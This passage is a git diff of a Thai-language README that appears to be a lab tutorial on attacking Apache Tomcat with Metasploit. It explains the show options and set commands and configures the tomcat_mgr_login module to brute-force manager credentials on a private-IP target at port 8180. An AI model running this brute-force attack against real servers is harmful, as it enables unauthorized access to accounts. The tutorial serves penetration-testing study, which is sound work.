@@ -40,7 +40,45 @@ use auxiliary/scanner/http/tomcat_mgr_login
 
 ![use](https://github.com/Atiwitch15101/Attacking-Apache-Tomcat-with-Metasploit/assets/159407312/32920552-4e06-4e91-b3e0-95fccecb9e99)
 
+### show options
 
+>คำสั่ง show options เมื่อใช้ Metasploit Framework ใช้เพื่อแสดงตัวเลือกและพารามิเตอร์ที่สามารถตั้งค่าสำหรับโมดูลที่เลือก ช่วยให้รู้ว่าต้องกำหนดค่าอะไรบ้างก่อนที่จะรันโมดูลนั้น
+
+```
+show options
+```
+
+![show op1](https://github.com/Atiwitch15101/Tomcat/assets/159407312/f10b8150-1873-449a-937e-97a1fe381181)
+
+### set
+
+>คำสั่ง set เมื่อใช้ Metasploit Framework ใช้เพื่อกำหนดค่าพารามิเตอร์สำหรับโมดูลที่เลือก
+
+`BRUTEFORCE_SPEED` ตั้งความเร็วในการ brute force (1-5, ค่า 5 เร็วสุด)
+`RHOSTS` ระบุเป้าหมายหรือกลุ่มเป้าหมาย (เช่น IP หรือช่วง IP)
+`STOP_ON_SUCCESS` หยุดการโจมตีเมื่อประสบความสำเร็จ (true/false)
+`RPORT` ระบุพอร์ตของเป้าหมาย (เช่น 80 สำหรับ HTTP)
+
+```
+set BRUTEFORCE_SPEED 8
+```
+
+```
+set BRUTEFORCE_SPEED 5
+```
+
+```
+set RHOSTS 192.168.19.175
+```
+
+```
+set STOP_ON_SUCCESS true
+```
+
+```
+set RPORT 8180
+```
+![set](https://github.com/Atiwitch15101/Tomcat/assets/159407312/0c6d6159-8413-4831-9be7-5ee49929a4a4)
 
 
 
